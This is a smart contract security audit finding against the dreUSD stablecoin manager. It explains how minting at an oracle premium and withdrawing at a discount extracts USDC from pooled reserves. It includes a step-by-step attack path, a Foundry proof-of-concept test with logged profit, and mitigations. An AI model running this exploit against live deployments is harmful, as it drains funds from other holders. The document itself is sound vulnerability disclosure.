# S-1 Oracle-price-based mint/withdraw conversion lets an attacker extract pooled stablecoin reserves via temporal price-deviation arbitrage.

## Summary

`dreUSD.sol:mint()` converts deposited stablecoins into `dreUSD` using the current oracle price, while `requestWithdrawal()`/`requestExpressWithdrawal()` convert `dreUSD` back into USDC using the oracle price at withdrawal request time. Because these two conversions are symmetric inverses of the same instantaneous oracle price rather than a fixed $1.00 peg, any oracle price movement between minting and withdrawal request—even entirely within the protocol's configured deviation threshold—creates a guaranteed arbitrage opportunity.

An attacker can mint `dreUSD` when the oracle reports a premium and later request withdrawal when the oracle reports a discount, locking in more USDC than was originally deposited. The excess payout comes directly from the shared `custodianVault`/Aave-backed liquidity pool rather than the attacker's own funds, allowing repeated extraction of protocol reserves.

---

## Root Cause

`dreUSDManager.sol:_mintDreUSD()` calculates the amount of `dreUSD` to mint using:

```solidity
IDreUSDOracle.getUsdValue(asset, amountIn)
```
https://github.com/sherlock-audit/2026-04-dre-labs-audits-Sourav-IIITBPL/blob/4973bf52551dfca508cce7315b957e02f2bf2936/dreusd/contracts/dreUSDManager.sol#L948-L965

which effectively performs:

```text
dreUSDAmount = amountIn × oraclePrice
```

Conversely, ` dreUSDManager.sol: requestWithdrawal()` and ` dreUSDManager.sol: requestExpressWithdrawal()` determine the USDC payout using:

```solidity
IDreUSDOracle.getTokenAmount(usdc, dreUSDAmount)
```

which effectively performs:

```text
usdcAmount = dreUSDAmount ÷ oraclePrice
```

https://github.com/sherlock-audit/2026-04-dre-labs-audits-Sourav-IIITBPL/blob/4973bf52551dfca508cce7315b957e02f2bf2936/dreusd/contracts/dreUSDManager.sol#L479-L497

Neither path clamps the oracle price to the intended $1.00 peg. Instead, both trust whatever value lies within the configured `deviationThreshold` (default: 100 bps).

As a result:

```
price_at_mint ≠ price_at_withdraw_request
```

causes the round-trip conversion to become value-accretive for the attacker instead of value-neutral.

---

## Internal Preconditions

* The stablecoin is allowlisted.
* An oracle is configured for the stablecoin (default configuration for USDC).
* No privileged role or protocol misconfiguration is required.
* The issue exists under the default 1% deviation threshold.

---

## External Preconditions

The Chainlink price feed reports two different values (both within the configured deviation threshold) between:

1. the mint transaction, and
2. the withdrawal request transaction.

This does **not** require oracle manipulation. Ordinary feed updates, exchange-source lag, or temporary stablecoin premiums/discounts are sufficient.

---

## Attack Path

1. Oracle reports **USDC = $1.01**, which is still within the default 1% deviation threshold.

2. The attacker calls:

```solidity
mint(usdc, 1_000_000e6, minOut, deadline)
```

`getUsdValue()` returns approximately:

```
$1,010,000
```

The attacker receives:

```
1,010,000 dreUSD
```

after depositing only:

```
1,000,000 USDC
```

3. Later, the oracle reports **USDC = $0.99**, or even simply returns toward $1.00.

4. The attacker immediately calls:

```solidity
requestWithdrawal(1_010_000e18, minOut, deadline)
```

`getTokenAmount()` computes:

```
1,010,000 / 0.99
≈ 1,020,202 USDC
```

This payout amount is locked into the withdrawal request immediately. The subsequent 7-day fulfillment delay merely transfers the already-fixed amount.

5. Final outcome:

```
Deposited: 1,000,000 USDC
Receivable: ≈1,020,202 USDC

Profit: ≈20,202 USDC (~2%)
```

The profit is paid entirely from the shared `custodianVault`/Aave liquidity pool backing all `dreUSD` holders.

Because there is no mechanism linking mint frequency to withdrawal frequency, the attacker can repeat this process indefinitely.

---

## Impact

A malicious user can repeatedly extract value from the protocol by exploiting normal oracle price fluctuations that remain entirely within the accepted deviation band.

This results in:

* Direct depletion of pooled USDC reserves.
* Losses borne collectively by all `dreUSD`/`dreUSDs` holders.
* A completely permissionless attack requiring no privileged access.
* No flash loan, atomic transaction, or oracle manipulation.
* Per-trade profit bounded only by the configured deviation threshold.
* Aggregate losses unbounded through repeated execution and large deposit sizes.

---

## POC 

- paste the following file in `test` folder .
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {DreUSDMock} from "../contracts/mocks/DreUSDMock.sol";
import {ERC4626Mock} from "../contracts/mocks/ERC4626Mock.sol";
import {DreUSDOracleMock} from "../contracts/mocks/DreUSDOracleMock.sol";
import {WithdrawalNFTMock} from "../contracts/mocks/WithdrawalNFTMock.sol";
import {SanctionsListMock} from "../contracts/mocks/SanctionsListMock.sol";
import {dreUSDManager} from "../contracts/dreUSDManager.sol";

contract PoCTest is Test {
    dreUSDManager public manager;
    dreUSDManager public implementation;
    ERC1967Proxy public proxy;

    DreUSDMock public dreUSD;
    ERC4626Mock public dreUSDs;
    MockERC20 public usdc;
    DreUSDOracleMock public oracle;
    SanctionsListMock public sanctionsList;
    WithdrawalNFTMock public expressNFT;
    WithdrawalNFTMock public withdrawalNFT;

    address public defaultAdmin;
    address public moderator;
    address public withdrawalConfig;
    address public pauser;
    address public keeper;
    address public partner;
    address public treasury;
    address public upgrader;
    address public attacker;
    address public depositCustodian;
    address public expressFeeRecipient;
    address public expressFillerPayback;

    function setUp() public {
        dreUSD = new DreUSDMock();
        dreUSDs = new ERC4626Mock(address(dreUSD));
        usdc = new MockERC20("USDC", "USDC", 6);
        oracle = new DreUSDOracleMock();
        sanctionsList = new SanctionsListMock();
        expressNFT = new WithdrawalNFTMock();
        withdrawalNFT = new WithdrawalNFTMock();

        defaultAdmin = makeAddr("defaultAdmin");
        moderator = makeAddr("moderator");
        withdrawalConfig = makeAddr("withdrawalConfig");
        pauser = makeAddr("pauser");
        keeper = makeAddr("keeper");
        partner = makeAddr("partner");
        treasury = makeAddr("treasury");
        upgrader = makeAddr("upgrader");
        attacker = makeAddr("attacker");
        depositCustodian = makeAddr("depositCustodian");
        expressFeeRecipient = makeAddr("expressFeeRecipient");
        expressFillerPayback = makeAddr("expressFillerPayback");

        implementation = new dreUSDManager(
            address(dreUSD),
            address(dreUSDs),
            address(usdc),
            address(oracle),
            address(expressNFT),
            address(withdrawalNFT)
        );

        dreUSDManager.RoleAddresses memory roles = dreUSDManager.RoleAddresses({
            defaultAdmin: defaultAdmin,
            upgrader: upgrader,
            moderator: moderator,
            withdrawalConfig: withdrawalConfig,
            pauser: pauser,
            keeper: keeper,
            expressOperator: partner,
            treasury: treasury
        });

        bytes memory initData = abi.encodeWithSelector(
            dreUSDManager.initialize.selector,
            expressFillerPayback,
            expressFeeRecipient,
            roles
        );

        proxy = new ERC1967Proxy(address(implementation), initData);
        manager = dreUSDManager(address(proxy));

        vm.startPrank(defaultAdmin);
        dreUSD.grantRole(dreUSD.MANAGER_ROLE(), address(manager));
        dreUSD.setSanctionsList(address(sanctionsList));
        vm.stopPrank();

        vm.startPrank(moderator);
        manager.updateVault(depositCustodian);
        manager.updateAllowedList(address(usdc), true);
        vm.stopPrank();

        oracle.setPriceDecimals(address(usdc), 8);

        usdc.mint(attacker, 1_000_000e6);
        vm.prank(attacker);
        usdc.approve(address(manager), type(uint256).max);
    }

    function test_MintAtPremium_WithdrawAtDiscount() public {
        uint256 depositAmount = 1_000_000e6;
        uint256 mintUsdValue = 1_010_000e8;
        uint256 withdrawUsdcPayout = 1_020_202_020_202;

        console2.log("step_1_attacker_usdc_balance_before_attack", usdc.balanceOf(attacker));

        oracle.setUsdValue(address(usdc), mintUsdValue);

        vm.prank(attacker);
        manager.mint(address(usdc), depositAmount, 1_000_000e18, block.timestamp + 1 days);

        uint256 dreUSDMinted = dreUSD.balanceOf(attacker);
        console2.log("step_2_usdc_deposited", depositAmount);
        console2.log("step_2_oracle_usd_value_used_at_mint", mintUsdValue);
        console2.log("step_2_dreusd_minted", dreUSDMinted);

        oracle.setTokenAmount(address(usdc), withdrawUsdcPayout);

        vm.prank(attacker);
        uint256 tokenId = manager.requestWithdrawal(dreUSDMinted, depositAmount, block.timestamp + 1 days);

        console2.log("step_3_dreusd_burned_for_withdrawal", dreUSDMinted);
        console2.log("step_3_usdc_amount_locked_for_withdrawal", withdrawUsdcPayout);
        console2.log("step_3_withdrawal_token_id", tokenId);

        vm.warp(block.timestamp + 7 days + 1);

        usdc.mint(treasury, 2_000_000e6);
        vm.prank(treasury);
        usdc.approve(address(manager), type(uint256).max);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;

        vm.prank(treasury);
        manager.fillWithdrawal(tokenIds, false);

        uint256 attackerFinalBalance = usdc.balanceOf(attacker);
        console2.log("step_4_attacker_usdc_balance_after_fill", attackerFinalBalance);

        assertGt(attackerFinalBalance, depositAmount);

        uint256 profit = attackerFinalBalance - depositAmount;
        console2.log("result_usdc_deposited", depositAmount);
        console2.log("result_usdc_received", attackerFinalBalance);
        console2.log("result_net_profit_extracted_from_protocol_reserves", profit);
    }
}

 ```
#### Expected Outcome 
```solidity
   [PASS] test_MintAtPremium_WithdrawAtDiscount() (gas: 367332)  
Logs:  
  step_1_attacker_usdc_balance_before_attack 1000000000000  
  step_2_usdc_deposited 1000000000000  
  step_2_oracle_usd_value_used_at_mint 101000000000000  
  step_2_dreusd_minted 1010000000000000000000000  
  step_3_dreusd_burned_for_withdrawal 1010000000000000000000000  
  step_3_usdc_amount_locked_for_withdrawal 1020202020202  
  step_3_withdrawal_token_id 1  
  step_4_attacker_usdc_balance_after_fill 1020202020202  
  result_usdc_deposited 1000000000000  
  result_usdc_received 1020202020202  
  result_net_profit_extracted_from_protocol_reserves 20202020202  
 ```
---

## Recommended Mitigation

The protocol should ensure that minting and redemption cannot benefit from temporary stablecoin premiums or discounts.

Possible mitigations include:

* During minting, cap the effective conversion price at:

```text
min(oraclePrice, $1.00)
```

so a stablecoin trading above peg never mints more than one `dreUSD` per dollar deposited.

* During withdrawals, similarly cap the effective conversion price at:

```text
min(oraclePrice, $1.00)
```

or otherwise guarantee that the mint-side and withdrawal-side pricing cannot diverge in a way that benefits users.

* Alternatively, track each user's deposited cost basis and redeem against that accounting instead of repricing deposits using a fresh oracle snapshot.

The key invariant should be that users can never redeem more dollar value than was originally deposited solely because the oracle price changed between minting and withdrawal.
